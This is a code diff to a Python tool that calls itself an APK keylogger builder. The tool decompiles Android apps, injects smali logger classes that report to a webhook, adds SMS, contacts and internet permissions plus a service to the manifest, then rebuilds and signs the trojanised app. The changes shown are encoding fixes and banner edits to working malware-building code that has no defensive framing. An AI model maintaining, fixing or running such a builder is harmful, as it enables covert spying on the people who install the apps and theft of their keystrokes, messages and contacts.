@@ -1,9 +1,10 @@
 #!/usr/bin/env python3
 """
 ============================================================
-  TERMUX APK KEYLOGGER BUILDER v3.6 (NO AAPT REQUIRED)
-  Uses apktool -r to avoid resource compilation.
-  Developer: GT Security Team
+  TERMUX APK KEYLOGGER BUILDER v3.6 (FINAL)
+  - Uses apktool -r (no aapt)
+  - Handles encoding errors in manifest
+  - Developer: GT Security Team
 ============================================================
 """
 
@@ -275,7 +276,7 @@ def upload_to_cloud(filepath):
         pass
     return None
 
-# ---------------------------- INJECTION ENGINE (NO AAPT) ----------------------------
+# ---------------------------- INJECTION ENGINE (NO AAPT, ENCODING FIX) ----------------------------
 def inject_apk(input_apk, output_dir, webhook, features, interval):
     work_dir = os.path.join(output_dir, f"work_{uuid.uuid4()}")
     os.makedirs(work_dir, exist_ok=True)
@@ -297,17 +298,19 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
 
         # Write smali files
         outer_smali, inner_smali = generate_smali(webhook, features, interval)
-        with open(os.path.join(smali_dir, "CustomLogger.smali"), "w") as f:
+        with open(os.path.join(smali_dir, "CustomLogger.smali"), "w", encoding='utf-8') as f:
             f.write(outer_smali)
-        with open(os.path.join(smali_dir, "CustomLogger$1.smali"), "w") as f:
+        with open(os.path.join(smali_dir, "CustomLogger$1.smali"), "w", encoding='utf-8') as f:
             f.write(inner_smali)
         print_c("[DEBUG] Smali files written to: " + smali_dir, Colors.CYAN)
 
-        # Modify manifest (still decoded as XML)
+        # ---------- MODIFY MANIFEST (with encoding error handling) ----------
         manifest_path = os.path.join(work_dir, "AndroidManifest.xml")
-        with open(manifest_path, "r") as f:
+        # Read with 'ignore' to skip invalid UTF-8 bytes
+        with open(manifest_path, "r", encoding='utf-8', errors='ignore') as f:
             manifest = f.read()
 
+        # Add permissions
         perms = ['android.permission.INTERNET']
         if features.get('sms'): perms.append('android.permission.READ_SMS')
         if features.get('contacts'): perms.append('android.permission.READ_CONTACTS')
@@ -323,7 +326,8 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
         if service_tag not in manifest:
             manifest = manifest.replace('</application>', f'    {service_tag}\n</application>')
 
-        with open(manifest_path, "w") as f:
+        # Write back with UTF-8
+        with open(manifest_path, "w", encoding='utf-8') as f:
             f.write(manifest)
 
         # ---------- REBUILD (no aapt needed) ----------
@@ -338,7 +342,7 @@ def inject_apk(input_apk, output_dir, webhook, features, interval):
             shutil.rmtree(work_dir, ignore_errors=True)
             raise Exception("APK rebuild failed. Ensure apktool is working.")
 
-        # Sign & align (unchanged)
+        # Sign & align
         print_c("[*] Signing APK...", Colors.YELLOW)
         apk_signed = os.path.join(work_dir, "app-signed.apk")
         sign_cmd = [
@@ -406,7 +410,7 @@ def show_banner():
     print_c("""
     ╔═══════════════════════════════════════════╗
     ║   APK KEYLOGGER BUILDER v3.6             ║
-    ║   No aapt required – works in Termux     ║
+    ║   No aapt – handles encoding issues      ║
     ╚═══════════════════════════════════════════╝
     """, Colors.CYAN)
 
